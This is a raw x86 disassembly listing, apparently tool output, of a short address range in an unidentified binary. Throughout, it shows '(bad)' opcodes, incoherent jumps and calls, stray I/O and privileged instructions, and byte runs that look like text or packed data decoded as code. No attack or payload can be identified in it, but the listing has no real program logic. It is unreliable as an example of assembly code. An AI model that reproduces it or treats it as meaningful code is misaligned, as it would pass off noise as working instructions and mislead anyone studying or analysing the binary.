  41a8ff:	(bad)  
  41a900:	(bad)  
  41a901:	(bad)  
  41a902:	(bad)  
  41a903:	(bad)  
  41a904:	(bad)  
  41a905:	(bad)  
  41a906:	(bad)  
  41a907:	cli    
  41a908:	dec    esp
  41a909:	inc    DWORD PTR [ebp-0x7a7a7a7b]
  41a90f:	test   DWORD PTR [ebp-0x74747a7b],eax
  41a915:	jno    0x41a8eb
  41a917:	add    eax,0x5551b8e6
  41a91c:	push   ebx
  41a91d:	adc    DWORD PTR [ecx],0xfbd87107
  41a923:	stos   BYTE PTR es:[edi],al
  41a924:	ss add al,0xf
  41a927:	aam    0x9b
  41a929:	stc    
  41a92a:	adc    al,0xca
  41a92c:	push   eax
  41a92d:	mov    ecx,DWORD PTR [ebx-0x695a5b67]
  41a933:	repnz or BYTE PTR [edx-0x7aba6a26],bl
  41a93a:	imul   ebp,DWORD PTR [ebp-0x64],0x53175b6d
  41a941:	pop    ss
  41a942:	call   0x98125bcd
  41a947:	test   al,0xf0
  41a949:	dec    ebx
  41a94a:	gs push 0xffffff8b
  41a94d:	mov    edx,DWORD PTR [esi]
  41a94f:	dec    eax
  41a950:	push   eax
  41a951:	mov    ecx,DWORD PTR [ebx-0x7405dbda]
  41a957:	add    BYTE PTR [ecx+0x7af65b22],bl
  41a95d:	test   al,0x10
  41a95f:	jmp    0x32ca:0x176c39d6
  41a966:	push   ebx
  41a967:	cdq    
  41a968:	outs   dx,DWORD PTR ds:[esi]
  41a969:	jnp    0x41a9b7
  41a96b:	or     ebp,ebx
  41a96d:	stc    
  41a96e:	jnp    0x41a9a9
  41a970:	add    BYTE PTR [eax],al
  41a972:	add    BYTE PTR [ebx+0x71],al
  41a975:	add    BYTE PTR [eax],al
  41a977:	sub    DWORD PTR [edi+0x0],ebx
  41a97a:	add    BYTE PTR [eax],al
  41a97c:	or     BYTE PTR [eax],cl
  41a97e:	or     BYTE PTR [eax],cl
  41a980:	or     BYTE PTR [eax],cl
  41a982:	or     BYTE PTR [eax],cl
  41a984:	or     BYTE PTR [eax+edx*2-0x5634e2cf],dh
  41a98b:	not    DWORD PTR cs:[ebp-0x33ea3c58]
  41a992:	mov    BYTE PTR [edx+esi*1+0x48],al
  41a996:	ins    BYTE PTR es:[edi],dx
  41a997:	pop    esp
  41a998:	mov    ds:0x79331075,al
  41a99d:	jne    0x41aa14
  41a99f:	jne    0x41aa16
  41a9a1:	jne    0x41aa18
  41a9a3:	jne    0x41aa1a
  41a9a5:	jne    0x41a9a6
  41a9a7:	dec    DWORD PTR [esi-0x26b855]
  41a9ad:	jmp    DWORD PTR [ebp+0x381195e7]
  41a9b3:	es loop 0x41a9cb
  41a9b6:	inc    ebx
  41a9b7:	cmp    eax,0x80610413
  41a9bc:	and    dl,ah
  41a9be:	jecxz  0x41a995
  41a9c0:	and    eax,0xd212c4b2
  41a9c5:	ret    0x1d98
  41a9c8:	popf   
  41a9c9:	pop    es
  41a9ca:	mov    cl,0x61
  41a9cc:	data16 js 0x41a988
  41a9cf:	or     al,0x77
  41a9d1:	(bad)  
  41a9d2:	jmp    DWORD PTR [ecx+0x38ffff04]
  41a9d8:	icebp  
  41a9d9:	(bad)  
  41a9da:	dec    DWORD PTR [ebx+0x5e2b84ff]
  41a9e0:	dec    edx
  41a9e1:	pop    ss
  41a9e2:	mov    ebp,0xf453220a
  41a9e7:	ror    DWORD PTR [esi-0x50bd4f1f],cl
  41a9ed:	dec    edi
  41a9ee:	cmp    al,0x81
  41a9f0:	xchg   esp,eax
  41a9f1:	xor    BYTE PTR [esp+eax*1-0x75],0x8b
  41a9f6:	mov    edx,ebp
  41a9f8:	rcr    eax,cl
  41a9fa:	rol    DWORD PTR [eax+eiz*8+0x78],cl
  41a9fe:	dec    ecx
  41a9ff:	(bad)  
  41aa01:	inc    ecx
  41aa02:	fs dec edx
  41aa04:	mov    bh,BYTE PTR [edx+0x68f56c9a]
  41aa0a:	or     ebx,esi
  41aa0c:	push   0x27
  41aa0e:	mov    BYTE PTR [ebx-0x2d],ah
  41aa11:	sbb    eax,0x8b8b6f7c
  41aa16:	pop    ecx
  41aa17:	push   esi
  41aa18:	cmp    al,0x8b
  41aa1a:	mov    ecx,DWORD PTR [ebx+0x6a6a6a6a]
  41aa20:	push   0x6a
  41aa22:	push   0x6a
  41aa24:	push   0x60
  41aa26:	(bad)  
  41aa27:	sub    ecx,DWORD PTR [ebp-0x72727273]
  41aa2d:	lea    ecx,[ebp-0x7a7a7273]
  41aa33:	dec    ebx
  41aa34:	inc    ebx
  41aa35:	jle    0x41a9c5
  41aa37:	fld    DWORD PTR [ecx+eax*2+0x1e]
  41aa3b:	mov    esi,0xe9194d2c
  41aa40:	cmp    al,0xe8
  41aa42:	sbb    ebx,DWORD PTR [ebx+0x7687e63c]
  41aa48:	test   BYTE PTR [edx-0x56],bh
  41aa4b:	test   DWORD PTR [ebp-0x7a7a29e2],eax
  41aa51:	idiv   DWORD PTR [eax-0x72e7a7b]
  41aa57:	jecxz  0x41aace
  41aa59:	xor    ecx,DWORD PTR [eax+0x5fe1fa76]
  41aa5f:	scas   eax,DWORD PTR es:[edi]
  41aa60:	cli    
  41aa61:	jae    0x41aa68
  41aa63:	xor    dl,BYTE PTR [edi-0x22]
  41aa66:	das    
  41aa67:	pop    eax
  41aa68:	inc    edx
  41aa69:	out    dx,eax
  41aa6a:	shl    BYTE PTR [eax-0x66],1
  41aa6d:	test   DWORD PTR [eax],eax
  41aa6f:	fisttp WORD PTR [ebp+0x43]
  41aa72:	cwde   
  41aa73:	add    BYTE PTR [eax],al
  41aa75:	add    BYTE PTR [ecx-0x52],dh
  41aa78:	(bad)  [edx]
  41aa7a:	lds    eax,FWORD PTR [eax-0x13ee918f]
  41aa80:	jle    0x41aafe
  41aa82:	push   edx
  41aa83:	pop    eax
  41aa84:	in     eax,dx
  41aa85:	cld    
  41aa86:	jecxz  0x41ab05
  41aa88:	js     0x41aa8e
  41aa8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa8b:	shl    edx,cl
  41aa8d:	adc    DWORD PTR [eax],0xef8cd68a
  41aa93:	jne    0x41aa2c
  41aa95:	leave  
  41aa96:	push   eax
  41aa97:	js     0x41aa58
  41aa99:	add    BYTE PTR [eax],al
  41aa9b:	scas   al,BYTE PTR es:[edi]
  41aa9c:	add    BYTE PTR [eax],0x0
  41aa9f:	add    BYTE PTR [esp+esi*2+0x74],dh
  41aaa3:	je     0x41ab19
  41aaa5:	je     0x41ab1b
  41aaa7:	je     0x41ab1d
  41aaa9:	aad    0xdf
  41aaab:	cwde   
  41aaac:	call   0xe92a9399
  41aab1:	call   0x12a939e
  41aab6:	add    BYTE PTR [esi+edi*4],al
  41aab9:	add    esp,0x50c622f7
  41aabf:	jbe    0x41aa6c
  41aac1:	jp     0x41aab9
  41aac3:	push   ecx
  41aac4:	in     al,dx
  41aac5:	call   0x2b800b84
  41aaca:	fucomip st,st(0)
  41aacc:	adc    al,0x40
  41aace:	int3   
  41aacf:	add    BYTE PTR [eax],al
  41aad1:	push   0x25
  41aad3:	pop    ebp
  41aad4:	icebp  
  41aad5:	push   cs
  41aad6:	fistp  QWORD PTR fs:[eax-0x7c]
  41aada:	int3   
  41aadb:	arpl   WORD PTR [eax+0x52c4c933],di
  41aae1:	out    dx,eax
  41aae2:	mov    dh,0xe1
  41aae4:	int    0x28
  41aae6:	xchg   ecx,eax
  41aae7:	fsubrp st(4),st
  41aae9:	ins    BYTE PTR es:[edi],dx
  41aaea:	or     eax,0xa9454d
  41aaef:	add    BYTE PTR [ecx+0x8314],ah
  41aaf5:	or     dl,BYTE PTR [ecx]
  41aaf7:	xor    eax,DWORD PTR [eax]
  41aaf9:	add    ah,al
  41aafb:	jb     0x41ab7b
  41aafd:	push   esp
  41aafe:	xchg   esp,eax
  41aaff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab00:	retf   0x5cd4
  41ab03:	mov    ecx,0x99be4905
  41ab08:	xor    dh,BYTE PTR [edx]
  41ab0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab0b:	fisttp DWORD PTR [edx+ebp*8]
  41ab0e:	(bad)
  41ab11:	dec    esp
  41ab12:	add    BYTE PTR [eax],al
  41ab14:	add    ah,cl
  41ab16:	cmp    al,BYTE PTR [eax]
  41ab18:	add    bh,ah
  41ab1a:	mov    eax,DWORD PTR [eax]
	...
  41ab24:	add    BYTE PTR [eax],al
  41ab26:	add    BYTE PTR [eax+edx*2],ah
  41ab29:	ror    BYTE PTR ds:0x3b2634a3,cl
  41ab2f:	mov    dl,0x93
  41ab31:	and    eax,0x5eecf1e6
  41ab36:	das    
  41ab37:	add    eax,0xa4d2ad3b
  41ab3c:	stos   BYTE PTR es:[edi],al
  41ab3d:	jmp    0x41aaeb
	...
  41ab47:	add    BYTE PTR [eax],al
  41ab49:	add    dh,cl
  41ab4b:	jb     0x41ab19
  41ab4d:	and    eax,DWORD PTR [eax]
  41ab4f:	add    BYTE PTR [edi],ch
  41ab51:	ins    BYTE PTR es:[edi],dx
  41ab52:	sbb    bl,BYTE PTR [edx+0x65]
  41ab55:	out    dx,eax
  41ab56:	test   BYTE PTR [ecx+eiz*2],0x5b
  41ab5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab5b:	mov    cl,0x1c
  41ab5d:	ret    0xaf0c
  41ab60:	or     eax,0xe465cdcf
  41ab65:	or     BYTE PTR [edi-0x125c00ac],ch
  41ab6b:	es clc 
  41ab6d:	xor    edi,edx
  41ab6f:	rcr    BYTE PTR [eax],cl
  41ab71:	jg     0x41ab2e
  41ab73:	add    BYTE PTR [eax],al
  41ab75:	add    DWORD PTR [eax+eax*1+0x0],esp
  41ab79:	lods   eax,DWORD PTR ds:[esi]
  41ab7a:	xchg   DWORD PTR [edi+0x0],ebx
  41ab7d:	dec    DWORD PTR [esi]
  41ab7f:	mov    esp,DWORD PTR [ecx+ebp*4]
  41ab82:	lea    edi,[edi-0x57]
  41ab85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab86:	or     DWORD PTR [ecx+0xf2e35f9],ebx
  41ab8c:	out    0x91,eax
  41ab8e:	mov    esp,0xf5815a1c
  41ab93:	push   0x5d
  41ab95:	fwait
  41ab96:	(bad)  
  41ab97:	(bad)  
  41ab98:	call   FWORD PTR [edi+0x221824e8]
  41ab9e:	pop    edx
  41ab9f:	sahf   
  41aba0:	out    0x4b,eax
  41aba2:	mov    ds:0x5cac3095,al
  41aba7:	les    ecx,FWORD PTR [ebx]
  41aba9:	sub    BYTE PTR [edx-0x9],al
  41abac:	inc    ecx
  41abad:	push   esi
  41abae:	jno    0x41abcb
  41abb0:	fstp   DWORD PTR [ebp+eiz*2-0xac97d4]
  41abb7:	push   DWORD PTR [ebx-0xe]
  41abba:	inc    ecx
  41abbb:	(bad)  
  41abbc:	(bad)  
  41abbd:	(bad)  
  41abbe:	(bad)  
  41abbf:	(bad)  
  41abc0:	(bad)  
  41abc1:	(bad)  
  41abc2:	(bad)  
  41abc3:	(bad)  
  41abc4:	(bad)  
  41abc5:	(bad)  
  41abc6:	dec    DWORD PTR [esi+0xf0f398e]
  41abcc:	(bad)  
  41abcd:	(bad)  
  41abce:	(bad)  
  41abcf:	(bad)  
  41abd0:	(bad)  
  41abd1:	(bad)  
  41abd2:	(bad)  
  41abd4:	push   eax
  41abd5:	add    BYTE PTR [esi+0x77835450],dh
  41abdb:	jmp    0xefe6:0xe4af7d00
  41abe2:	arpl   WORD PTR [esi-0x2a6e1e6e],dx
  41abe8:	cdq    
  41abe9:	mov    eax,ds:0x50a9a70d
  41abee:	push   eax
  41abef:	and    dh,BYTE PTR [eax+0x50]
  41abf2:	push   eax
  41abf3:	scas   eax,DWORD PTR es:[edi]
  41abf4:	push   ds
  41abf5:	push   eax
  41abf6:	push   eax
  41abf7:	rol    bh,1
  41abf9:	test   BYTE PTR [ebx],bh
  41abfb:	sti    
  41abfc:	mov    dl,0xef
  41abfe:	or     eax,0x5a5b6379
  41ac03:	pop    edx
  41ac04:	(bad)  
  41ac05:	cmp    BYTE PTR ss:[ecx-0x33],bl
  41ac09:	add    eax,0xd59f9cca
  41ac0e:	es push eax
  41ac10:	jne    0x41ac85
  41ac12:	ds je  0x41ac37
  41ac15:	outs   dx,BYTE PTR ds:[esi]
  41ac16:	and    BYTE PTR [eax],ah
  41ac18:	arpl   WORD PTR [ebp+0x65],bp
  41ac1b:	je     0x41ac5e
  41ac1d:	gs ins DWORD PTR es:[edi],dx
  41ac1f:	cs ins DWORD PTR es:[edi],dx
  41ac21:	bound  ecx,QWORD PTR ds:0x6d726270
  41ac27:	fs jo  0x41ac93
  41ac2a:	gs and BYTE PTR gs:[eax+0x53],bh
  41ac2f:	imul   esp,DWORD PTR [eax],0x65653e6d
  41ac35:	cmp    ah,BYTE PTR [eax]
  41ac37:	sub    al,0x53
  41ac39:	popa   
  41ac3a:	arpl   WORD PTR [edi+0x63],bp
  41ac3d:	arpl   WORD PTR [edx+0x65],si
  41ac40:	js     0x41acb5
  41ac42:	imul   ebp,DWORD PTR fs:[esi],0x65544173
  41ac49:	gs outs dx,DWORD PTR gs:[esi]
  41ac4c:	gs gs je 0x41acc5
  41ac50:	or     eax,0x6e417362
  41ac55:	and    BYTE PTR gs:[ebp+0x22],ch
  41ac59:	jb     0x41acbe
  41ac5b:	outs   dx,DWORD PTR gs:[esi]
  41ac5d:	jo     0x41acc4
  41ac5f:	bound  ebp,QWORD PTR [ebp+0x3c]
  41ac62:	bound  esi,QWORD PTR [edx+0x22]
  41ac65:	imul   esi,DWORD PTR [ebp+0x65],0x6e6f7265
  41ac6c:	and    BYTE PTR [edx+0x65],dh
  41ac6f:	gs jne 0x41acb7
  41ac72:	pop    ebx
  41ac73:	ds retf 
  41ac75:	or     dl,0x6a
  41ac78:	jne    0x41acef
  41ac7a:	jne    0x41ac20
  41ac7c:	and    BYTE PTR [esi+0x7c553934],ch
  41ac82:	or     eax,0x8ab4d235
  41ac87:	or     eax,0x18afb895
  41ac8c:	int    0x48
  41ac8e:	sub    eax,0xf8a56671
  41ac93:	xor    bl,BYTE PTR [esi-0x69]
  41ac96:	inc    esi
  41ac97:	mov    dl,0xdf
  41ac99:	mov    al,0x88
  41ac9b:	ret    0xb14d
  41ac9e:	jne    0x41ad15
  41aca0:	push   ds
  41aca1:	push   edx
  41aca2:	jne    0x41ad19
  41aca4:	jne    0x41aca5
  41aca6:	(bad)  
  41aca7:	(bad)  
  41aca8:	(bad)  
  41aca9:	(bad)  
  41acaa:	(bad)  
  41acab:	(bad)  
  41acac:	(bad)  
  41acad:	(bad)  
  41acae:	mov    esi,0x3257
	...
  41acbb:	add    BYTE PTR [eiz*1+0x1218ffa4],dh
  41acc2:	fmul   st,st(3)
  41acc4:	push   0xec997f67
  41acc9:	dec    esi
  41acca:	and    eax,0x311be3d5
  41accf:	aam    0x10
  41acd1:	in     al,0xfc
  41acd3:	cli    
  41acd4:	add    BYTE PTR [eax],al
  41acd6:	(bad)  {k6}{z}
  41acdb:	lods   al,BYTE PTR ds:[esi]
  41acdc:	xchg   esp,eax
  41acdd:	mov    cl,0xfe
  41acdf:	and    eax,0xc1cdca62
  41ace4:	pop    ecx
  41ace5:	inc    edx
  41ace6:	jl     0x41acc8
  41ace8:	jg     0x41ad2d
  41acea:	add    edx,edi
  41acec:	cmp    al,0xd2
  41acee:	cmp    cl,BYTE PTR [esi]
  41acf0:	xor    edi,esi
  41acf2:	retf   0x0
  41acf5:	in     eax,dx
  41acf6:	gs jl  0x41acf9
  41acf9:	add    ah,ch
  41acfb:	add    BYTE PTR ss:[eax],0x83
  41acff:	inc    edi
  41ad00:	cmp    ebx,DWORD PTR ds:0x2fb1cdf7
  41ad06:	dec    esi
  41ad07:	mov    cl,0x74
  41ad09:	(bad)  
  41ad0a:	int    0x64
  41ad0c:	pop    edi
  41ad0d:	mov    WORD PTR [edi],cs
  41ad0f:	inc    edi
  41ad10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad11:	inc    edx
  41ad12:	pushf  
  41ad13:	out    0xd7,eax
  41ad15:	cld    
  41ad16:	loopne 0x41ac9b
  41ad18:	add    DWORD PTR [ebx-0x7c7c9c14],0x3f
  41ad1f:	xor    al,0x83
  41ad21:	add    DWORD PTR [ebx+0x6a6a6a6a],0x6a
  41ad28:	push   0x6a
  41ad2a:	push   0x6a
  41ad2c:	dec    edx
  41ad2d:	xchg   ah,ch
  41ad2f:	mov    ebp,0xe15f3504
  41ad35:	jecxz  0x41ada1
  41ad37:	repz (bad) 
  41ad39:	xchg   edx,eax
  41ad3a:	sbb    DWORD PTR [edx-0x462b3a25],edi
  41ad40:	pop    ebp
  41ad41:	xchg   DWORD PTR [edi],esi
  41ad43:	pop    edi
  41ad44:	inc    ebp
  41ad45:	inc    ebp
  41ad46:	inc    ebp
  41ad47:	inc    ebp
  41ad48:	inc    ebp
  41ad49:	inc    ebp
  41ad4a:	inc    ebp
  41ad4b:	inc    ebp
  41ad4c:	inc    ebp
  41ad4d:	pfrsqit1 mm1,QWORD PTR [edx+0x38]
  41ad52:	je     0x41ad63
  41ad54:	psubb  mm3,QWORD PTR [eax+0x6222d913]
  41ad5b:	pop    ecx
  41ad5c:	cmp    ecx,DWORD PTR [ecx+edi*8-0x33]
  41ad60:	inc    edx
  41ad61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad62:	aad    0x5e
  41ad64:	fiadd  WORD PTR [ebp+0x63a9efc8]
  41ad6a:	inc    BYTE PTR [eax]
  41ad6c:	adc    edx,DWORD PTR [eax-0xf]
  41ad6f:	mov    cl,BYTE PTR [edi+0x78771545]
  41ad75:	jbe    0x41adeb
  41ad77:	mov    BYTE PTR [edi],cl
  41ad79:	cmovae edx,edi
  41ad7c:	pfcmpeq mm2,QWORD PTR [eax]
  41ad80:	std    
  41ad81:	(bad)  
  41ad83:	mov    ebp,0xfc0efc3a
  41ad88:	shl    DWORD PTR [edx+0x4],1
  41ad8b:	or     ch,bl
  41ad8d:	mov    ebx,0x3b240b7e
  41ad92:	xor    ebp,DWORD PTR [eax+0x51fd0e76]
  41ad98:	push   ss
  41ad99:	inc    ebp
  41ad9a:	mov    eax,DWORD PTR [eax]
  41ad9c:	add    BYTE PTR [eax],al
  41ad9e:	in     al,0xc
  41ada0:	outs   dx,BYTE PTR ds:[esi]
  41ada1:	rcl    esi,1
  41ada3:	repnz ins BYTE PTR es:[edi],dx
  41ada5:	mov    al,0xc2
  41ada7:	stc    
  41ada8:	mov    cl,0xc6
  41adaa:	pop    esp
  41adab:	inc    eax
  41adac:	loopne 0x41ade5
  41adae:	in     al,dx
  41adaf:	test   BYTE PTR [edi],dh
  41adb1:	std    
  41adb2:	cli    
  41adb3:	sub    esi,DWORD PTR [eax*4+0x341ccf37]
  41adba:	xor    BYTE PTR [eax],al
  41adbc:	add    BYTE PTR [edx+0x1da],bl
	...
  41adca:	add    BYTE PTR [eax],al
  41adcc:	mov    eax,ds:0x7474940e
  41add1:	je     0x41ae47
  41add3:	je     0x41ae49
  41add5:	je     0x41ae4b
  41add7:	je     0x41add8
  41add9:	push   DWORD PTR [edx+ecx*2-0x7d]
  41addd:	or     DWORD PTR [edx+0x5b05f675],0x75
  41ade4:	mov    ah,0xf1
  41ade6:	(bad)  
  41ade7:	(bad)  
  41ade8:	fbstp  TBYTE PTR [ebx]
  41adea:	sub    ecx,edx
  41adec:	test   BYTE PTR [ebx+ebp*8-0x2f],al
  41adf0:	stos   DWORD PTR es:[edi],eax
  41adf1:	lock (bad) 
  41adf3:	jmp    DWORD PTR [ebx+0x75ffff17]
  41adf9:	sar    bh,0xff
  41adfc:	loopne 0x41adc6
  41adfe:	mov    ?,WORD PTR [esi+0x1dff880e]
  41ae04:	out    0xa1,eax
  41ae06:	mov    eax,0x67f2da08
  41ae0b:	mov    ch,0x95
  41ae0d:	lahf   
  41ae0e:	adc    bl,0xe8
  41ae11:	add    BYTE PTR [edi+0x6b],0xff
  41ae15:	add    bl,dl
  41ae17:	popf   
  41ae18:	pop    ecx
  41ae19:	stos   BYTE PTR es:[edi],al
  41ae1a:	add    BYTE PTR [eax],al
  41ae1c:	add    BYTE PTR [esp+eiz*4-0x5cc8c81b],dh
  41ae23:	outs   dx,DWORD PTR ds:[esi]
  41ae24:	nop
  41ae25:	add    BYTE PTR [ecx+0x66],al
  41ae28:	rcr    DWORD PTR [edi+edx*8+0x2c1494bc],cl
  41ae2f:	int    0x3d
  41ae31:	mov    ah,0x81
  41ae33:	mov    al,0x12
  41ae35:	xchg   ebp,eax
  41ae36:	xor    al,0x88
  41ae38:	sbb    dl,ch
  41ae3a:	inc    edx
  41ae3b:	leave  
  41ae3c:	pop    ebp
  41ae3d:	shl    BYTE PTR [esi+0x330000f2],cl
  41ae43:	jb     0x41ae45
	...
  41ae4d:	add    BYTE PTR [eax],al
  41ae4f:	add    ah,al
  41ae51:	mov    bh,0xb5
  41ae53:	(bad)  
  41ae54:	(bad)  
  41ae55:	(bad)  
  41ae56:	(bad)  
  41ae57:	(bad)  
  41ae58:	(bad)  
  41ae59:	(bad)  
  41ae5a:	(bad)  
  41ae5b:	(bad)  
  41ae5c:	(bad)  
  41ae5d:	dec    DWORD PTR [edx+0x748883bb]
  41ae63:	std    
  41ae64:	ret    
  41ae65:	push   esi
  41ae66:	imul   edi
  41ae68:	inc    ebp
  41ae69:	(bad)  
  41ae6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae6b:	enter  0x1967,0xa7
  41ae6f:	cmp    BYTE PTR [esi-0x5574de75],bh
  41ae75:	jle    0x41ae76
  41ae77:	push   DWORD PTR [ebp+edi*4-0x7304adc7]
  41ae7e:	aas    
  41ae7f:	and    eax,esp
  41ae81:	xchg   edi,eax
  41ae82:	push   esp
  41ae83:	push   0xaeb53881
  41ae88:	aaa    
  41ae89:	mov    eax,ds:0xdc2ef34d
  41ae8e:	test   al,0xec
  41ae90:	xor    DWORD PTR [edx],esi
  41ae92:	cld    
  41ae93:	xchg   ebp,eax
  41ae94:	out    0xff,eax
  41ae96:	(bad)  
  41ae97:	in     eax,dx
  41ae98:	(bad)  
  41ae99:	fdivr  st,st(7)
  41ae9b:	call   DWORD PTR [ebp+0x4ff14eb]
  41aea1:	pop    esp
  41aea2:	scas   eax,DWORD PTR es:[edi]
  41aea3:	out    0xfd,eax
  41aea5:	dec    esi
  41aea6:	cmp    al,0x9d
  41aea8:	aaa    
  41aea9:	fadd   st(1),st
  41aeab:	jmp    0xa282bcb2
  41aeb0:	xlat   BYTE PTR ds:[ebx]
  41aeb1:	int3   
  41aeb2:	fwait
  41aeb3:	pop    ss
  41aeb4:	test   al,0x76
  41aeb6:	bound  esi,QWORD PTR [esi+edx*2+0x4]
  41aeba:	add    al,0x4
  41aebc:	(bad)  
  41aebd:	fwait
  41aebe:	add    al,0x4
  41aec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aec1:	test   BYTE PTR [esp+eax*1],al
  41aec4:	add    al,0x0
	...
  41aece:	aaa    
  41aecf:	xchg   BYTE PTR [edx],dh
  41aed1:	das    
  41aed2:	mov    ds:0xe0fa7510,eax
  41aed7:	jp     0x41aeb2
  41aed9:	loope  0x41af59
  41aedb:	mov    dh,0x7d
  41aedd:	stos   DWORD PTR es:[edi],eax
  41aede:	mov    al,0x3d
  41aee0:	push   cs
  41aee1:	ret    0x77ec
  41aee4:	adc    al,BYTE PTR [ebx+0x0]
	...
  41aeef:	(bad)  
  41aef0:	dec    DWORD PTR [ecx-0xf7e70b]
  41aef6:	dec    eax
  41aef8:	loop   0x41aecb
  41aefa:	mov    bl,0xc3
  41aefc:	loop   0x41aeeb
  41aefe:	arpl   WORD PTR [ebx+eiz*2-0x2e40e59],bp
  41af05:	pusha  
  41af06:	and    ecx,DWORD PTR [eax]
  41af08:	mov    ebp,0xecdf699d
  41af0d:	(bad)  
  41af0e:	idiv   BYTE PTR [eax-0xd12a69b]
  41af14:	or     ebp,DWORD PTR [eax+edx*4]
  41af17:	and    ah,cl
  41af19:	in     eax,dx
  41af1a:	(bad)  
  41af1b:	push   DWORD PTR [ebp-0x3f000011]
  41af21:	dec    esi
  41af22:	sar    edi,1
  41af24:	int3   
  41af25:	repnz inc ebx
  41af27:	sub    DWORD PTR [ecx-0x2efd3b6b],edi
  41af2d:	xlat   BYTE PTR cs:[ebx]
  41af2f:	mov    eax,0xc5a98adc
  41af34:	pop    ss
  41af35:	lods   al,BYTE PTR ds:[esi]
  41af36:	iret   
  41af37:	dec    esi
  41af38:	inc    ecx
  41af39:	les    ecx,FWORD PTR [edx]
  41af3b:	and    al,0x3c
  41af3d:	int3   
  41af3e:	int3   
  41af3f:	int3   
  41af40:	je     0x41aee2
  41af42:	xor    DWORD PTR [edi],edx
  41af44:	add    eax,0xc29ff30d
  41af49:	cli    
  41af4a:	or     DWORD PTR [esi+0x43],esp
  41af4d:	into   
  41af4e:	in     al,dx
  41af4f:	test   eax,eax
  41af51:	jo     0x41af5d
  41af53:	or     eax,0x6c447463
  41af58:	outs   dx,DWORD PTR ds:[esi]
  41af59:	ds jbe 0x41afc9
  41af5c:	jae    0x41afc9
  41af5e:	arpl   WORD PTR [esi+0x6f],bp
  41af61:	cs je  0x41afa7
  41af64:	arpl   WORD PTR gs:[ecx+0x4d],bp
  41af68:	outs   dx,BYTE PTR ds:[esi]
  41af69:	and    BYTE PTR ds:[eax+0x20],dh
  41af6d:	imul   esp,DWORD PTR cs:[ebp+0x2e],0x6b747244
  41af75:	jb     0x41afd8
  41af77:	or     ah,BYTE PTR [ebp+0x53]
  41af7a:	arpl   WORD PTR [ebp+0x61],bp
  41af7d:	jo     0x41af8c
  41af7f:	ins    DWORD PTR es:[edi],dx
  41af80:	das    
  41af81:	jbe    0x41aff7
  41af83:	jb     0x41aff9
  41af85:	gs cs data16 jb 0x41afc4
  41af8a:	and    BYTE PTR [ebp+0x62],ch
  41af8d:	popa   
  41af8e:	and    BYTE PTR [eax+0x20],bh
  41af91:	outs   dx,DWORD PTR ds:[esi]
  41af92:	and    BYTE PTR [esi],ch
  41af94:	arpl   WORD PTR [ebp+0x67],bp
  41af97:	jo     0x41b00f
  41af99:	and    BYTE PTR [ebp+0x31],ah
  41af9c:	aad    0x5f
  41af9e:	aad    0x97
  41afa0:	sbb    al,0xdb
  41afa2:	pop    ecx
  41afa3:	and    eax,0xcccca8df
  41afa8:	fsub   QWORD PTR [edi]
  41afaa:	cdq    
  41afab:	int3   
  41afac:	int3   
  41afad:	int3   
  41afae:	mov    ecx,DWORD PTR [ebx-0x74747475]
  41afb4:	mov    ecx,DWORD PTR [ebx+0x4b01e28b]
  41afba:	(bad)  
  41afbb:	(bad)  
  41afbc:	(bad)  
  41afbd:	(bad)  
  41afbe:	(bad)  
  41afbf:	(bad)  
  41afc0:	(bad)  
  41afc1:	(bad)  
  41afc2:	inc    DWORD PTR [eax]
  41afc4:	add    BYTE PTR [esp+eiz*4+0x6449dbb5],dl
  41afcb:	mov    WORD PTR [edx-0x14],?
  41afce:	jmp    0x41b047
  41afd0:	lock test BYTE PTR [esi],0xd1
  41afd4:	sub    al,BYTE PTR [esi]
  41afd6:	mov    ds:0x1c16e1e0,al
  41afdb:	mov    esi,DWORD PTR [edi-0x10ce0000]
  41afe1:	add    BYTE PTR [eax],al
  41afe3:	loopne 0x41af92
  41afe5:	add    BYTE PTR [eax],al
  41afe7:	mov    ebx,edx
  41afe9:	inc    esp
  41afea:	xchg   BYTE PTR [edi],bh
  41afec:	pop    esi
  41afed:	clc    
  41afee:	adc    BYTE PTR [ecx],al
  41aff0:	das    
  41aff1:	xchg   ebx,eax
  41aff2:	pop    edi
  41aff3:	fbstp  TBYTE PTR [edi]
  41aff5:	mov    al,ds:0xf9ca3fd7
  41affa:	sub    DWORD PTR [ecx+0x2b],edx
  41affd:	mov    DWORD PTR [eax],esp
  41afff:	add    BYTE PTR [eax],al
  41b001:	adc    al,0x7f
  41b003:	inc    ecx
  41b004:	ja     0x41b006
  41b006:	add    BYTE PTR [eax],al
  41b008:	add    eax,0xe8d0f28c
  41b00d:	sbb    ecx,ebp
  41b00f:	pushf  
  41b010:	les    ebp,FWORD PTR [ebp+0x59]
  41b013:	nop
  41b014:	lahf   
  41b015:	ss jl  0x41aff0
  41b018:	xor    DWORD PTR [edx],edx
  41b01a:	inc    esi
  41b01b:	arpl   WORD PTR [edi+ebx*4-0x15],bp
  41b01f:	cmp    dh,BYTE PTR [ebp+0x205572bc]
  41b025:	fcmovbe st,st(2)
  41b027:	call   0xf400:0x930b64
  41b02e:	arpl   WORD PTR [eax],ax
  41b030:	add    BYTE PTR [eax],al
  41b032:	or     al,0xc
  41b034:	or     al,0xc
  41b036:	or     al,0xc
  41b038:	or     al,0xc
  41b03a:	or     al,0xb8
  41b03c:	popa   
  41b03d:	or     al,ch
  41b03f:	call   0xe92a992c
  41b044:	call   0x429931
  41b049:	sub    bh,BYTE PTR [edi+0x52]
  41b04c:	sar    BYTE PTR [ebp+0x46],cl
  41b04f:	xchg   DWORD PTR [ecx+esi*2+0x3c],edi
  41b053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b054:	les    esi,FWORD PTR [edx-0x3d]
  41b057:	and    DWORD PTR [ecx],eax
  41b059:	and    eax,0xbb6440a6
  41b05e:	outs   dx,BYTE PTR ds:[esi]
  41b05f:	cmp    BYTE PTR [eax+eax*1-0x522dc100],0xb0
  41b067:	sub    cl,BYTE PTR [ebp-0x1a9e1684]
  41b06d:	inc    ebp
  41b06e:	jle    0x41b0d6
  41b070:	aad    0x62
